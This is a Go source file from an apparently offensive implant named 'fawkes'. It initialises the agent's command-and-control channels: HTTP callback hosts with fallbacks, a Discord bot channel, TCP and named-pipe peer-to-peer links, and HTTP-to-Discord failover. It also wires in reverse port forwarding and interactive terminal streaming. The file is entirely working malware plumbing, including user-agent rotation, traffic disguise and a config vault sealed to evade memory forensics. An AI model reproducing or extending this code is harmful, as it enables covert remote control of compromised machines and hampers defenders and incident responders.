package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"strconv"
	"strings"

	"fawkes/pkg/commands"
	"fawkes/pkg/discord"
	"fawkes/pkg/http"
	"fawkes/pkg/httpx"
	"fawkes/pkg/profiles"
	"fawkes/pkg/rpfwd"
	"fawkes/pkg/structs"
	"fawkes/pkg/tcp"
)

// c2Setup holds the initialized C2 profile and associated managers.
type c2Setup struct {
	profile  profiles.Profile
	rpfwdMgr *rpfwd.Manager
}

// initC2Profile creates and configures the appropriate C2 profile based on
// build-time configuration variables. If failoverChain is set with multiple
// profiles (e.g., "http,discord"), a FailoverManager wraps them for automatic
// failover on persistent connection failures.
func initC2Profile(cfg parsedConfig) (*c2Setup, error) {
	if tcpBindAddress != "" || namedPipeBindName != "" {
		return initTCPC2(cfg)
	}
	if discordBotToken != "" && failoverChain == "" {
		return initDiscordC2(cfg)
	}
	if httpxConfig != "" && failoverChain == "" {
		return initHTTPxC2(cfg)
	}
	if failoverChain != "" && discordBotToken != "" {
		return initFailoverC2(cfg)
	}
	if httpxConfig != "" {
		return initHTTPxC2(cfg)
	}
	return initHTTPC2(cfg)
}

func initTCPC2(cfg parsedConfig) (*c2Setup, error) {
	if namedPipeBindName != "" {
		log.Printf("pipe %s", namedPipeBindName)
	} else {
		log.Printf("bind %s", tcpBindAddress)
	}
	tcpProfile := tcp.NewTCPProfile(tcpBindAddress, encryptionKey, cfg.debug, namedPipeBindName)
	if err := tcpProfile.SealConfig(); err != nil {
		log.Printf("tcp vault seal failed: %v", err)
	}
	// Make TCP profile available to link/unlink commands
	commands.SetTCPProfile(tcpProfile)
	return &c2Setup{
		profile: profiles.NewTCPProfile(tcpProfile),
	}, nil
}

func initDiscordC2(cfg parsedConfig) (*c2Setup, error) {
	log.Printf("discord c2")

	// Parse Discord-specific poll parameters
	pollDelay := 10
	if discordPollDelay != "" {
		if v, err := strconv.Atoi(discordPollDelay); err == nil && v > 0 {
			pollDelay = v
		}
	}
	pollChecks := 10
	if discordPollChecks != "" {
		if v, err := strconv.Atoi(discordPollChecks); err == nil && v > 0 {
			pollChecks = v
		}
	}

	discordProfile := discord.NewDiscordProfile(
		discordBotToken,
		discordChannelID,
		encryptionKey,
		cfg.sleepInterval,
		cfg.jitter,
		pollChecks,
		pollDelay,
		cfg.debug,
		proxyURL,
	)

	// Seal the Discord config vault — encrypts bot token, channel ID, and
	// encryption key with AES-256-GCM to reduce memory forensics exposure.
	if err := discordProfile.SealConfig(); err != nil {
		log.Printf("seal failed: %v", err)
	}

	// TCP P2P child management (Discord egress agents can also link to TCP children)
	tcpP2P := tcp.NewTCPProfile("", encryptionKey, cfg.debug)
	if err := tcpP2P.SealConfig(); err != nil {
		log.Printf("tcp p2p vault seal failed: %v", err)
	}
	commands.SetTCPProfile(tcpP2P)

	// Wire up delegate hooks for P2P routing through Discord
	discordProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
		return tcpP2P.DrainDelegatesOnly()
	}
	discordProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
		return tcpP2P.DrainDelegatesAndEdges()
	}
	discordProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
		tcpP2P.RouteToChildren(delegates)
	}

	// Wire up rpfwd hooks for reverse port forwarding
	rpfwdManager := rpfwd.NewManager()
	commands.SetRpfwdManager(rpfwdManager)
	discordProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
	discordProfile.HandleRpfwd = rpfwdManager.HandleMessages

	// Wire up interactive hooks for PTY/terminal bidirectional streaming
	discordProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
	discordProfile.HandleInteractive = commands.RouteInteractiveInput

	return &c2Setup{
		profile:  profiles.NewDiscordProfile(discordProfile),
		rpfwdMgr: rpfwdManager,
	}, nil
}

func initHTTPxC2(cfg parsedConfig) (*c2Setup, error) {
	log.Printf("httpx c2")

	// Decode the base64-encoded agent config JSON
	configBytes, err := base64.StdEncoding.DecodeString(httpxConfig)
	if err != nil {
		return nil, fmt.Errorf("httpx config decode failed: %v", err)
	}
	agentCfg, err := httpx.ParseAgentConfig(configBytes)
	if err != nil {
		return nil, fmt.Errorf("httpx config parse failed: %v", err)
	}

	// Parse callback domains
	var domains []string
	if httpxDomains != "" {
		for _, d := range strings.Split(httpxDomains, ",") {
			d = strings.TrimSpace(d)
			if d != "" {
				domains = append(domains, d)
			}
		}
	}
	if len(domains) == 0 {
		return nil, fmt.Errorf("httpx: no callback domains configured")
	}

	// Parse rotation and failover
	rotation := "fail-over"
	if httpxRotation != "" {
		rotation = httpxRotation
	}
	failoverThreshold := 5
	if httpxFailoverThreshold != "" {
		if v, err := strconv.Atoi(httpxFailoverThreshold); err == nil && v > 0 {
			failoverThreshold = v
		}
	}

	httpxProfile := httpx.NewHTTPXProfile(
		domains,
		rotation,
		failoverThreshold,
		encryptionKey,
		cfg.maxRetries,
		cfg.sleepInterval,
		cfg.jitter,
		cfg.debug,
		agentCfg,
		proxyURL,
		cfg.recoverySeconds,
	)

	// Seal the httpx config vault
	if err := httpxProfile.SealConfig(); err != nil {
		log.Printf("seal failed: %v", err)
	}

	// TCP P2P child management
	tcpP2P := tcp.NewTCPProfile("", encryptionKey, cfg.debug)
	if err := tcpP2P.SealConfig(); err != nil {
		log.Printf("tcp p2p vault seal failed: %v", err)
	}
	commands.SetTCPProfile(tcpP2P)

	// Wire up delegate hooks
	httpxProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
		return tcpP2P.DrainDelegatesOnly()
	}
	httpxProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
		return tcpP2P.DrainDelegatesAndEdges()
	}
	httpxProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
		tcpP2P.RouteToChildren(delegates)
	}

	// Wire up rpfwd hooks
	rpfwdManager := rpfwd.NewManager()
	commands.SetRpfwdManager(rpfwdManager)
	httpxProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
	httpxProfile.HandleRpfwd = rpfwdManager.HandleMessages

	// Wire up interactive hooks
	httpxProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
	httpxProfile.HandleInteractive = commands.RouteInteractiveInput

	return &c2Setup{
		profile:  profiles.NewHTTPXProfile(httpxProfile),
		rpfwdMgr: rpfwdManager,
	}, nil
}

func initHTTPC2(cfg parsedConfig) (*c2Setup, error) {
	// Build callback URL
	var callbackURL string
	if strings.HasPrefix(callbackHost, "http://") || strings.HasPrefix(callbackHost, "https://") {
		callbackURL = fmt.Sprintf("%s:%d", callbackHost, cfg.callbackPort)
	} else {
		callbackURL = fmt.Sprintf("http://%s:%d", callbackHost, cfg.callbackPort)
	}

	// Parse fallback C2 URLs (comma-separated, each gets same port appended if needed)
	var fallbackURLs []string
	if fallbackHosts != "" {
		for _, fb := range strings.Split(fallbackHosts, ",") {
			fb = strings.TrimSpace(fb)
			if fb == "" {
				continue
			}
			if strings.HasPrefix(fb, "http://") || strings.HasPrefix(fb, "https://") {
				fallbackURLs = append(fallbackURLs, fmt.Sprintf("%s:%d", fb, cfg.callbackPort))
			} else {
				fallbackURLs = append(fallbackURLs, fmt.Sprintf("http://%s:%d", fb, cfg.callbackPort))
			}
		}
	}

	// Parse content types (comma-separated list for request rotation)
	var ctList []string
	if contentTypes != "" {
		for _, ct := range strings.Split(contentTypes, ",") {
			ct = strings.TrimSpace(ct)
			if ct != "" {
				ctList = append(ctList, ct)
			}
		}
	}

	// Decode mTLS PEM data from base64 (ldflags can't carry raw PEM newlines)
	decodedCert, decodedKey := "", ""
	if mtlsCertPEM != "" {
		if decoded, err := base64.StdEncoding.DecodeString(mtlsCertPEM); err == nil {
			decodedCert = string(decoded)
		}
	}
	if mtlsKeyPEM != "" {
		if decoded, err := base64.StdEncoding.DecodeString(mtlsKeyPEM); err == nil {
			decodedKey = string(decoded)
		}
	}

	httpProfile := http.NewHTTPProfile(
		callbackURL,
		userAgent,
		encryptionKey,
		cfg.maxRetries,
		cfg.sleepInterval,
		cfg.jitter,
		cfg.debug,
		getURI,
		postURI,
		hostHeader,
		proxyURL,
		proxyUser,
		proxyPass,
		tlsVerify,
		tlsFingerprint,
		decodedCert,
		decodedKey,
		fallbackURLs,
		ctList,
		cfg.recoverySeconds,
	)
	// Set configurable HTTP timeout
	if cfg.httpTimeout != 30 {
		httpProfile.SetTimeout(cfg.httpTimeout)
	}
	// Parse User-Agent pool for per-request rotation
	if userAgentPool != "" {
		for _, ua := range strings.Split(userAgentPool, "\n") {
			ua = strings.TrimSpace(ua)
			if ua != "" {
				httpProfile.UserAgentPool = append(httpProfile.UserAgentPool, ua)
			}
		}
	}
	// Decode and apply custom HTTP headers from C2 profile
	if customHeaders != "" {
		if decoded, err := base64.StdEncoding.DecodeString(customHeaders); err == nil {
			var headers map[string]string
			if err := json.Unmarshal(decoded, &headers); err == nil {
				httpProfile.CustomHeaders = headers
			}
		}
	}

	if trafficProfile != "" {
		http.ApplyTrafficProfile(httpProfile, trafficProfile)
	}

	// Seal the C2 config vault — encrypts sensitive fields with AES-256-GCM.
	if err := httpProfile.SealConfig(); err != nil {
		log.Printf("seal failed: %v", err)
	}

	// TCP P2P child management — even HTTP egress agents can link to TCP children.
	tcpP2P := tcp.NewTCPProfile("", encryptionKey, cfg.debug)
	if err := tcpP2P.SealConfig(); err != nil {
		log.Printf("tcp p2p vault seal failed: %v", err)
	}
	commands.SetTCPProfile(tcpP2P)

	// Wire up delegate hooks so the HTTP profile routes P2P delegate messages
	httpProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
		return tcpP2P.DrainDelegatesOnly()
	}
	httpProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
		return tcpP2P.DrainDelegatesAndEdges()
	}
	httpProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
		tcpP2P.RouteToChildren(delegates)
	}

	// Wire up rpfwd hooks for reverse port forwarding
	rpfwdManager := rpfwd.NewManager()
	commands.SetRpfwdManager(rpfwdManager)
	httpProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
	httpProfile.HandleRpfwd = rpfwdManager.HandleMessages

	// Wire up interactive hooks for PTY/terminal bidirectional streaming
	httpProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
	httpProfile.HandleInteractive = commands.RouteInteractiveInput

	return &c2Setup{
		profile:  profiles.NewProfile(httpProfile),
		rpfwdMgr: rpfwdManager,
	}, nil
}

// initFailoverC2 builds an HTTP primary + Discord secondary profile chain wrapped
// in a FailoverManager. Both profiles share the same TCP P2P and rpfwd instances
// so P2P children and port forwards survive a profile switch.
func initFailoverC2(cfg parsedConfig) (*c2Setup, error) {
	log.Printf("failover c2: chain=%s", failoverChain)

	// Build shared TCP P2P instance
	tcpP2P := tcp.NewTCPProfile("", encryptionKey, cfg.debug)
	if err := tcpP2P.SealConfig(); err != nil {
		log.Printf("tcp p2p vault seal failed: %v", err)
	}
	commands.SetTCPProfile(tcpP2P)

	// Shared rpfwd manager
	rpfwdManager := rpfwd.NewManager()
	commands.SetRpfwdManager(rpfwdManager)

	// Build HTTP primary profile
	primarySetup, err := initHTTPC2(cfg)
	if err != nil {
		return nil, fmt.Errorf("failover: primary HTTP init failed: %w", err)
	}

	// Build Discord secondary profile (reuse shared TCP P2P + rpfwd)
	discordProfile := discord.NewDiscordProfile(
		discordBotToken,
		discordChannelID,
		encryptionKey,
		cfg.sleepInterval,
		cfg.jitter,
		10, 10, // default poll checks/delay
		cfg.debug,
		proxyURL,
	)
	if err := discordProfile.SealConfig(); err != nil {
		log.Printf("discord vault seal failed: %v", err)
	}
	discordProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
		return tcpP2P.DrainDelegatesOnly()
	}
	discordProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
		return tcpP2P.DrainDelegatesAndEdges()
	}
	discordProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
		tcpP2P.RouteToChildren(delegates)
	}
	discordProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
	discordProfile.HandleRpfwd = rpfwdManager.HandleMessages
	discordProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
	discordProfile.HandleInteractive = commands.RouteInteractiveInput

	fm := profiles.NewFailoverManager(
		[]profiles.Profile{primarySetup.profile, profiles.NewDiscordProfile(discordProfile)},
		[]string{"http", "discord"},
		cfg.failoverThreshold,
		cfg.failoverRecovery,
	)

	return &c2Setup{
		profile:  fm,
		rpfwdMgr: rpfwdManager,
	}, nil
}
